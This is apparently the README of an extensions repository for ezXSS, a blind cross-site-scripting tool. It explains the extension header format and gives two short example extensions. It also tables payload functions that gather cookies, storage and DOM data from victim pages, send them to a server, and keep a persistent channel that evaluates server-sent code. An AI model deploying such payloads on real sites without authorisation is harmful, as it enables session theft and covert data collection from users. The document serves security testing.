# ezXSS-extensions

This repository contains examples and documentation for creating extensions for [ezXSS](https://github.com/ssl/ezXSS). Extensions allow you to customize and extend the functionality of ezXSS payloads, enabling you to add new features or modify existing behaviors. Extensions are available starting from ezXSS version 4.3.

---

## What are ezXSS Extensions?

ezXSS extensions are JavaScript files that can be loaded into ezXSS payloads to modify or extend their behavior. They are inserted **after** all current functions in the payload, allowing you to override existing functions or add new ones.

Extensions are useful for:
- Adding custom data to reports
- Modifying how data is collected or sent
- Implementing new features not present in the default payload
- Sharing reusable code across multiple payloads

---

## How to Create an Extension

Every extension must start with a specific comment block that provides metadata about the extension. This is crucial for ezXSS to recognize and load the extension properly.

### Required Header

```javascript
// <ezXSS extension>
// @name              My First Extension
// @description       This is my first extension
// @author            Your Name
// @version           1.0
// </ezXSS extension>
```

- **`@name`**: The name of your extension.
- **`@description`**: A brief description of what the extension does.
- **`@author`**: Your name or handle.
- **`@version`**: The version number of your extension.

If this header is missing or incorrect, the extension will not load.

### Writing Your Extension Code

After the header, you can write your JavaScript code. This code can:
- Add new functions
- Override existing functions from the default payload
- Modify the `ez_rD.extra` object to include additional data in reports

#### Example: Adding Custom Data to Reports

```javascript
// <ezXSS extension>
// @name              Platform Info
// @description       Adds the user's platform to the report
// @author            ssl
// @version           1.0
// </ezXSS extension>

ez_rD.extra = {"platform": window.navigator.platform};
```

This simple extension adds the user's platform information via the `extra` field in the report.

#### Example: Overriding a Default Function

You can override any of the default functions to change their behavior. For instance, to modify how the DOM is collected:

```javascript
// <ezXSS extension>
// @name              Custom DOM Collector
// @description       Collects only the body HTML instead of the full document
// @author            ssl
// @version           1.0
// </ezXSS extension>

function ez_hL() {
    // Override the default ez_hL function
    try {
        ez_rD.dom = ez_n(document.body.outerHTML);
    } catch (e) {
        ez_rD.dom = "";
    }
    // Call other necessary functions
    ez_s();
    ez_nW();
    ez_cb(ez_rD, ez_dr2);
    ez_cp();
    ez_p();
}
```

#### The ez_rD Object
The ez_rD object stores all data sent in the report. By default, it includes fields like `uri`, `cookies`, `referer`, `user-agent`, `origin`, `localstorage`, `sessionstorage`, `dom`, `payload`, and `screenshot`.

To add custom fields to the report, you must use the `.extra` property of the `ez_rD` object:

- If `.extra` is set to a JSON object, each key-value pair will be added as a separate field in the report.
- If `.extra` is a string, it will be added as a single 'extra' field.

For example:
- `ez_rD.extra = {"platform": window.navigator.platform};` adds a `platform` field.
- `ez_rD.extra = "Custom message";` adds an extra field with the string value.

---

## Installing Extensions

There are three ways to install extensions in ezXSS:

1. **Via a Public GitHub Repo**: Point ezXSS to a public GitHub repository containing one or more `.js` extension files. ezXSS will install all extensions from the repo.
2. **Via a GitHub Gist**: Use a public or private Gist containing a single `.js` extension file.
3. **Via the ezXSS Panel**: Create and add a custom extension directly through the ezXSS management panel.

Once installed, extensions can be enabled or disabled for specific payloads. You can manually check for updates in the ezXSS panel, view the differences between versions, and accept updates if desired.

---

## Understanding Payload Functions

The ezXSS payload consists of several functions that handle data collection, sending reports, and optional persistence. Below are tables describing the functions included in the default payload and those added when persistence is enabled.

### Default Payload Functions

The default payload includes the following functions:

| Function Name      | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| `ez_n(e)`          | Returns the value of `e` if defined, otherwise an empty string.             |
| `ez_cb(e, t, o)`   | Sends collected data to the ezXSS server via POST.                          |
| `ez_hL()`          | Collects data and initiates the sending process.                            |
| `ez_p()`           | Handles persistence if enabled.                                             |
| `ez_s()`           | Sets fields to "Not collected" based on config.                             |
| `ez_cp()`          | Collects additional specified pages.                                        |
| `ez_as()`          | Implements spider functionality for linked pages.                           |
| `ez_dc(e)`         | Fetches and collects data from a URL.                                       |
| `ez_se(e)`         | Serializes the data object for sending.                                     |
| `ez_e()`           | Executes custom JS (pre-callback).                                          |
| `ez_l()`           | Executes global JS (pre-callback).                                          |
| `ez_y()`           | Executes custom JS (post-callback).                                         |
| `ez_esa()`         | Executes global JS (post-callback).                                         |
| `ez_aE(t, e, n)`   | Attaches events cross-browser.                                              |
| `ez_nW()`          | Executes custom and global JS before sending.                               |
| `ez_dr2(z)`        | Executes JS after the report is sent.                                       |

### Persist Functions

When the persistence feature is enabled, additional functions are included in the payload to maintain a connection with the server and handle navigation without reloading the page. These functions are:

| Function Name      | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| `ez_pin()`         | Sends a ping to the server with collected data every 10 seconds if active.  |
| `ez_stp()`         | Starts the interval for pinging if not already running.                     |
| `ez_eva(input)`    | Evaluates and executes input received from the server.                      |
| `eze_ini()`        | Initializes the payload, collects initial data, and sets up WebSocket if available. |
| `ez_persist()`     | Starts persistence by calling `eze_ini()` and `ez_pin()`.                   |
| `ez_stop()`        | Stops the persistence mechanism by setting an exit flag.                    |
| `ez_queue()`       | Manages a queue of requests to be sent to the server via WebSocket.         |
| `ez_dol(e, t, n)`  | Loads new content into the page, updates history, and executes scripts.     |
| `ez_hac(e)`        | Intercepts anchor clicks to handle same-domain navigation without reload.   |
| `ez_hab(e)`        | Tracks button clicks within forms for submission handling.                  |
| `ez_hap(e)`        | Handles popstate events to restore page state during navigation.            |
| `ez_fet(e, t, n)`  | Fetches data from a URL using XMLHttpRequest, supports async or sync calls. |
| `ez_soc(e, t)`     | Establishes and manages a WebSocket connection for real-time communication. |
| `ra_fl(e, t)`      | Formats log messages with a timestamp and log level.                        |
| `ra_wc(e, t)`      | Wraps console methods to capture logs.                                      |
| `ra_client()`      | Generates or retrieves a unique client ID.                                  |
| `ra_hL()`          | Collects data for the initial report.                                       |
| `ra_seh()`         | Sets up event handlers for navigation.                                      |
| `ra_li(e)`         | Handles link clicks for same-domain navigation.                             |
| `ra_fo(e)`         | Handles form submissions for same-domain actions.                           |
| `ra_r()`           | Registers event listeners for navigation and forms.                         |

---

## Example Extensions

This repository includes several example extensions to help you get started:

1. **`platform-info.js`**: Adds the user's platform to the report.
2. **`custom-dom-collector.js`**: Modifies the DOM collection to only include the body HTML.
3. **`alert-on-load.js`**: Displays an alert when the payload is loaded (for testing).

Feel free to use these examples as templates for your own extensions.

---

## Create and Share Your Own Extensions

Create your own extensions and share them on GitHub. Extensions can enhance the functionality of ezXSS for various use cases, and sharing them helps the community grow.

If you'd like to have your extension listed here, you can submit a pull request to add it to the list below.

**Community Extensions:**
- (None yet)
